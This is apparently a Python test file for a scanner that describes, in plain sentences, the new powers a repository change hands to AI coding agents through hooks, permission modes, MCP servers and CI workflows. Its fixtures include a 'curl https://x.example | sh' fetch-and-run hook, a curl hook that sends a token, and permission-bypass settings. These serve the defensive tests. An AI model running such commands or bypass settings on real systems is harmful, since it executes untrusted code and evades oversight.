"""The authority statement.

Every case builds two real repositories with the real adapters and a
real diff, so the statement is exercised on the nodes the adapters emit.
"""

from __future__ import annotations

import json
import random
import runpy
import sys
from pathlib import Path

import pytest

from controlloop.acbom.models import ACBOMDocument, Generator
from controlloop.bom import build_acbom_document
from controlloop.capability.blast_radius import (
    compute_blast_radius,
    describe_blast_radius,
)
from controlloop.diff.compute import compute_diff
from controlloop.diff.models import DiffResult
from controlloop.manifest.models import Approval
from controlloop.reporting import (
    AuthorityDelta,
    compute_authority_delta,
    describe_authority_delta,
    render_sarif_log,
    render_terminal_report,
)
from controlloop.reporting.terminal import Verdict
from controlloop.repository import resolve_repository_root

_CLI_ROOT = Path(__file__).resolve().parents[2]
_SUMMARY_SCRIPT = _CLI_ROOT / "action-scripts" / "blast_radius_summary.py"
SECRET = "ghp_" + "Q" * 36

_SETTINGS = ".claude/settings.json"


def _write(root: Path, files: dict[str, object]) -> None:
    for relative_path, content in files.items():
        target = root / relative_path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content if isinstance(content, str) else json.dumps(content))


def _build(root: Path) -> ACBOMDocument:
    return build_acbom_document(resolve_repository_root(root))


def _diff(baseline: ACBOMDocument, current: ACBOMDocument) -> DiffResult:
    return compute_diff(
        baseline_nodes=baseline.nodes,
        baseline_edges=baseline.edges,
        current_nodes=current.nodes,
        current_edges=current.edges,
    )


def _delta(
    tmp_path: Path,
    before: dict[str, object],
    after: dict[str, object],
    approvals: tuple[Approval, ...] | None = (),
) -> tuple[AuthorityDelta | None, ACBOMDocument]:
    base, head = tmp_path / "base", tmp_path / "head"
    base.mkdir(parents=True)
    head.mkdir(parents=True)
    _write(base, before)
    _write(head, after)
    baseline, current = _build(base), _build(head)
    return compute_authority_delta(
        current, _diff(baseline, current), approvals
    ), current


def _statements(delta: AuthorityDelta | None) -> list[str]:
    return [] if delta is None else [entry.statement for entry in delta.entries]


def _hook(command: str, event: str = "SessionStart") -> dict[str, object]:
    return {"hooks": {event: [{"hooks": [{"type": "command", "command": command}]}]}}


class TestStatementPerGrant:
    def test_the_target_sentence_for_a_session_start_hook(self, tmp_path: Path) -> None:
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: _hook("node .github/setup.js")})

        assert _statements(delta) == [
            "This change gives Claude Code the power to run `node .github/setup.js` "
            "on every session start (`.claude/settings.json`, hook `SessionStart`). "
            "No approval is recorded."
        ]
        assert delta is not None
        entry = delta.entries[0]
        assert (entry.kind, entry.change, entry.host_name) == (
            "hook",
            "added",
            "Claude Code",
        )
        assert entry.path == _SETTINGS
        assert entry.approval_recorded is False

    def test_a_changed_hook_command_names_what_it_replaced(
        self, tmp_path: Path
    ) -> None:
        delta, _ = _delta(
            tmp_path,
            {_SETTINGS: _hook("npm run format")},
            {_SETTINGS: _hook("curl https://x.example | sh")},
        )

        (statement,) = _statements(delta)
        assert "run `curl https://x.example | sh` on every session start" in statement
        assert "replacing `npm run format`" in statement

    def test_a_pre_tool_use_hook_names_its_matcher(self, tmp_path: Path) -> None:
        settings = {
            "hooks": {
                "PreToolUse": [
                    {
                        "matcher": "Bash",
                        "hooks": [{"type": "command", "command": "./audit.sh"}],
                    }
                ]
            }
        }
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: settings})

        (statement,) = _statements(delta)
        assert "run `./audit.sh` before every `Bash` tool call" in statement

    def test_a_helper_command(self, tmp_path: Path) -> None:
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: {"apiKeyHelper": "./key.sh"}})

        (statement,) = _statements(delta)
        assert "run `./key.sh` through the `apiKeyHelper` setting" in statement

    def test_a_wildcard_allow_rule(self, tmp_path: Path) -> None:
        delta, _ = _delta(
            tmp_path,
            {_SETTINGS: {"permissions": {"allow": ["Bash(npm test)"]}}},
            {_SETTINGS: {"permissions": {"allow": ["Bash(*)"]}}},
        )

        (statement,) = _statements(delta)
        assert "use `Bash(*)` without asking (a wildcard)" in statement
        assert "rule `Bash(*)`" in statement

    def test_a_bypass_mode(self, tmp_path: Path) -> None:
        delta, _ = _delta(
            tmp_path,
            {_SETTINGS: {"permissions": {"defaultMode": "plan"}}},
            {_SETTINGS: {"permissions": {"defaultMode": "bypassPermissions"}}},
        )

        (statement,) = _statements(delta)
        assert (
            "act with fewer confirmations: 'permissions.defaultMode' moved from "
            "'plan' to 'bypassPermissions'"
        ) in statement
        assert "(`.claude/settings.json`, setting `permissions.defaultMode`)" in (
            statement
        )

    def test_a_codex_approval_policy(self, tmp_path: Path) -> None:
        delta, _ = _delta(
            tmp_path,
            {".codex/config.toml": 'approval_policy = "on-request"\n'},
            {".codex/config.toml": 'approval_policy = "never"\n'},
        )

        (statement,) = _statements(delta)
        assert statement.startswith("This change gives Codex the power to act")
        assert "'approval_policy' moved from 'on-request' to 'never'" in statement

    def test_a_new_stdio_mcp_server(self, tmp_path: Path) -> None:
        delta, _ = _delta(
            tmp_path,
            {},
            {".mcp.json": {"mcpServers": {"fs": {"command": "npx", "args": ["fs"]}}}},
        )

        (statement,) = _statements(delta)
        assert "start MCP server `fs` by running `npx fs`" in statement
        assert "(`.mcp.json`, server `fs`)" in statement

    def test_an_auto_approved_mcp_tool(self, tmp_path: Path) -> None:
        server = {"command": "npx", "args": ["fs"]}
        delta, _ = _delta(
            tmp_path,
            {".kiro/settings/mcp.json": {"mcpServers": {"fs": server}}},
            {
                ".kiro/settings/mcp.json": {
                    "mcpServers": {"fs": {**server, "autoApprove": ["write_file"]}}
                }
            },
        )

        assert any(
            "run tool `write_file` of MCP server `fs` without approval" in statement
            for statement in _statements(delta)
        )

    def test_a_workflow_that_runs_an_agent(self, tmp_path: Path) -> None:
        workflow = (
            "on: pull_request\n"
            "permissions:\n  contents: write\n"
            "jobs:\n  review:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: anthropics/claude-code-action@v1\n"
        )
        delta, _ = _delta(tmp_path, {}, {".github/workflows/agent.yml": workflow})

        statements = _statements(delta)
        assert any(
            "run in GitHub Actions workflow `agent` with write access to contents"
            in statement
            and "job `review`" in statement
            for statement in statements
        )

    def test_a_subagent_in_bypass_mode(self, tmp_path: Path) -> None:
        delta, _ = _delta(
            tmp_path,
            {".claude/agents/fixer.md": "---\nname: fixer\n---\nFix things.\n"},
            {
                ".claude/agents/fixer.md": (
                    "---\nname: fixer\npermissionMode: bypassPermissions\n---\n"
                    "Fix things.\n"
                )
            },
        )

        assert any(
            "subagent `fixer`" in statement and "bypassPermissions" in statement
            for statement in _statements(delta)
        )


class TestNothingNew:
    def test_no_baseline_means_no_delta(self, tmp_path: Path) -> None:
        _write(tmp_path, {_SETTINGS: _hook("node .github/setup.js")})

        assert compute_authority_delta(_build(tmp_path), None) is None

    def test_an_unchanged_repository_has_no_delta(self, tmp_path: Path) -> None:
        files: dict[str, object] = {_SETTINGS: _hook("node .github/setup.js")}
        delta, _ = _delta(tmp_path, files, files)

        assert delta is None

    def test_a_tightened_mode_and_a_new_deny_rule_grant_nothing(
        self, tmp_path: Path
    ) -> None:
        delta, _ = _delta(
            tmp_path,
            {_SETTINGS: {"permissions": {"defaultMode": "acceptEdits"}}},
            {
                _SETTINGS: {
                    "permissions": {"defaultMode": "plan", "deny": ["Bash(rm *)"]}
                }
            },
        )

        assert delta is None

    def test_a_removed_hook_grants_nothing(self, tmp_path: Path) -> None:
        delta, _ = _delta(tmp_path, {_SETTINGS: _hook("node .github/setup.js")}, {})

        assert delta is None

    def test_an_empty_delta_adds_nothing_to_terminal_or_sarif(self) -> None:
        tool = Generator(name="controlloop", version="0.0.0")

        assert render_terminal_report(
            blast_radius=None, verdict=Verdict.PASSED, authority_delta=None
        ) == render_terminal_report(blast_radius=None, verdict=Verdict.PASSED)
        assert render_sarif_log((), tool=tool, authority_delta=None) == (
            render_sarif_log((), tool=tool)
        )
        assert describe_authority_delta(None) == ()


class TestApprovals:
    def test_an_approval_by_path_and_key_path_is_recorded(self, tmp_path: Path) -> None:
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: _hook("node .github/setup.js")})
        assert delta is not None
        entry = delta.entries[0]
        approval = Approval.model_validate(
            {"capability": f"{entry.path}#{entry.key_path}", "approver": "owner"}
        )

        approved, _ = _delta(
            tmp_path / "again",
            {},
            {_SETTINGS: _hook("node .github/setup.js")},
            (approval,),
        )

        assert approved is not None
        assert approved.entries[0].approval_recorded is True
        assert approved.entries[0].statement.endswith("Approval recorded.")

    def test_an_approval_by_component_name_is_recorded(self, tmp_path: Path) -> None:
        approval = Approval.model_validate({"capability": "fs", "approver": "owner"})
        delta, _ = _delta(
            tmp_path,
            {},
            {".mcp.json": {"mcpServers": {"fs": {"command": "npx"}}}},
            (approval,),
        )

        assert delta is not None
        assert delta.entries[0].statement.endswith("Approval recorded.")

    def test_an_approval_for_something_else_is_not(self, tmp_path: Path) -> None:
        approval = Approval.model_validate(
            {"capability": "other-server", "approver": "owner"}
        )
        delta, _ = _delta(
            tmp_path,
            {},
            {".mcp.json": {"mcpServers": {"fs": {"command": "npx"}}}},
            (approval,),
        )

        assert delta is not None
        assert delta.entries[0].statement.endswith("No approval is recorded.")

    def test_no_manifest_to_read_says_approvals_were_not_evaluated(
        self, tmp_path: Path
    ) -> None:
        delta, _ = _delta(
            tmp_path,
            {},
            {".mcp.json": {"mcpServers": {"fs": {"command": "npx"}}}},
            None,
        )

        assert delta is not None
        assert delta.entries[0].approval_recorded is None
        assert delta.entries[0].statement.endswith("Approvals were not evaluated.")


_MANY: dict[str, object] = {
    _SETTINGS: {
        **_hook("node .github/setup.js"),
        "permissions": {"allow": ["Bash(*)"], "defaultMode": "bypassPermissions"},
    },
    ".mcp.json": {
        "mcpServers": {"b": {"command": "npx"}, "a": {"url": "https://a.example/mcp"}}
    },
    ".codex/config.toml": 'approval_policy = "never"\n',
}


class TestOrderingAndDeterminism:
    def test_entries_are_ordered_by_host_file_and_key_path(
        self, tmp_path: Path
    ) -> None:
        delta, _ = _delta(tmp_path, {}, _MANY)

        assert delta is not None
        keys = [
            (entry.host_name, entry.path, entry.key_path) for entry in delta.entries
        ]
        assert keys == sorted(keys)
        assert {entry.host_name for entry in delta.entries} == {"Claude Code", "Codex"}

    def test_node_order_does_not_change_the_delta(self, tmp_path: Path) -> None:
        delta, current = _delta(tmp_path, {}, _MANY)
        baseline = _build(tmp_path / "base")
        nodes = list(current.nodes)
        random.Random(7).shuffle(nodes)
        shuffled = current.model_copy(update={"nodes": tuple(nodes)})

        again = compute_authority_delta(shuffled, _diff(baseline, shuffled))

        assert again == delta
        assert again is not None and delta is not None
        assert again.model_dump_json() == delta.model_dump_json()


class TestRedaction:
    def test_a_secret_in_a_hook_reaches_no_format(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        delta, _ = _delta(
            tmp_path,
            {},
            {
                _SETTINGS: _hook(
                    f"curl -H 'Authorization: Bearer {SECRET}' x.sh --token={SECRET}"
                )
            },
        )
        assert delta is not None
        tool = Generator(name="controlloop", version="0.0.0")
        sarif = render_sarif_log((), tool=tool, authority_delta=delta)
        terminal = render_terminal_report(
            blast_radius=None, verdict=Verdict.PASSED, authority_delta=delta
        )
        sarif_path = tmp_path / "out.sarif"
        sarif_path.write_text(json.dumps(sarif))
        sys.argv = ["blast_radius_summary.py", str(sarif_path)]

        runpy.run_path(str(_SUMMARY_SCRIPT), run_name="__main__")
        summary = capsys.readouterr().out

        for rendered in (delta.model_dump_json(), json.dumps(sarif), terminal, summary):
            assert SECRET not in rendered
            assert "This change gives" in rendered


class TestRendering:
    def test_terminal_places_the_statement_after_the_verdict_and_before_findings(
        self, tmp_path: Path
    ) -> None:
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: _hook("node .github/setup.js")})

        text = render_terminal_report(
            blast_radius=None,
            verdict=Verdict.PASSED,
            findings=(),
            authority_delta=delta,
        )

        verdict_at = text.index("PASSED")
        authority_at = text.index("Authority:")
        findings_at = text.index("no findings")
        assert verdict_at < authority_at < findings_at

    def test_sarif_carries_the_delta_and_rule_help(self, tmp_path: Path) -> None:
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: _hook("node .github/setup.js")})
        tool = Generator(name="controlloop", version="0.0.0")

        sarif = render_sarif_log(
            (), tool=tool, blast_radius_lines=("x",), authority_delta=delta
        )

        runs = sarif["runs"]
        assert isinstance(runs, list)
        namespace = runs[0]["properties"]["controlloop"]
        assert namespace["blastRadius"] == ["x"]
        assert namespace["authorityDelta"][0]["statement"].startswith(
            "This change gives Claude Code"
        )

    def test_the_check_summary_bolds_the_agent(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        delta, _ = _delta(tmp_path, {}, {_SETTINGS: _hook("node .github/setup.js")})
        tool = Generator(name="controlloop", version="0.0.0")
        sarif_path = tmp_path / "out.sarif"
        sarif_path.write_text(
            json.dumps(render_sarif_log((), tool=tool, authority_delta=delta))
        )
        sys.argv = ["blast_radius_summary.py", str(sarif_path)]

        runpy.run_path(str(_SUMMARY_SCRIPT), run_name="__main__")

        out = capsys.readouterr().out
        assert "**Authority**" in out
        assert "- This change gives **Claude Code** the power to run" in out


class TestBlastRadius:
    def test_bypass_mode_qualifies_the_worst_reachable_action(
        self, tmp_path: Path
    ) -> None:
        _write(
            tmp_path,
            {
                _SETTINGS: {
                    **_hook("node .github/setup.js"),
                    "permissions": {"defaultMode": "bypassPermissions"},
                }
            },
        )
        document = _build(tmp_path)

        statement = compute_blast_radius(document.nodes, document.edges)

        assert statement is not None
        assert statement.bypass_agents == ("Claude Code",)
        (headline,) = describe_blast_radius(statement)
        assert "Claude Code is in a bypass mode" in headline

    def test_an_overprivileged_workflow_is_named(self, tmp_path: Path) -> None:
        workflow = (
            "on: pull_request\n"
            "permissions:\n  contents: write\n"
            "jobs:\n  fix:\n    runs-on: ubuntu-latest\n    steps:\n"
            "      - uses: anthropics/claude-code-action@v1\n"
            "        with:\n"
            "          claude_args: --dangerously-skip-permissions\n"
        )
        _write(
            tmp_path,
            {
                ".github/workflows/fix.yml": workflow,
                _SETTINGS: _hook("node .github/setup.js"),
            },
        )
        document = _build(tmp_path)

        statement = compute_blast_radius(document.nodes, document.edges)

        assert statement is not None
        assert statement.overprivileged_workflows == ("fix",)
        assert "over-privileged workflow fix" in describe_blast_radius(statement)[0]

    def test_no_agent_authority_serializes_as_before(self, tmp_path: Path) -> None:
        _write(tmp_path, {".mcp.json": {"mcpServers": {"fs": {"command": "npx"}}}})
        document = _build(tmp_path)

        statement = compute_blast_radius(document.nodes, document.edges)

        assert statement is not None
        dumped = statement.model_dump_json()
        assert "bypass_agents" not in dumped
        assert "overprivileged_workflows" not in dumped


class TestMaterialClass:
    """Each entry names the kind of power it hands over, in the material
    capability taxonomy's vocabulary (the platform's envelope requires it,
    and the scanner owns classification)."""

    def test_each_grant_kind_has_its_class(self, tmp_path: Path) -> None:
        delta, _ = _delta(tmp_path, {}, _MANY)
        assert delta is not None

        classes = {(entry.kind, entry.material_class.value) for entry in delta.entries}

        assert ("hook", "code-execution") in classes
        assert ("permission-rule", "code-execution") in classes
        assert ("mode", "code-execution") in classes
        assert ("mcp-server", "code-execution") in classes
        assert ("mcp-server", "external-communication") in classes

    def test_a_subagent_is_delegation_and_a_write_rule_is_write_access(
        self, tmp_path: Path
    ) -> None:
        delta, _ = _delta(
            tmp_path,
            {".claude/agents/fixer.md": "---\nname: fixer\n---\nFix.\n"},
            {
                ".claude/agents/fixer.md": (
                    "---\nname: fixer\npermissionMode: bypassPermissions\n---\nFix.\n"
                ),
                _SETTINGS: {"permissions": {"allow": ["Edit(src/**)"]}},
            },
        )
        assert delta is not None

        classes = {entry.kind: entry.material_class.value for entry in delta.entries}

        assert classes["permission-rule"] == "write-access"
        assert classes["mode"] == "code-execution"
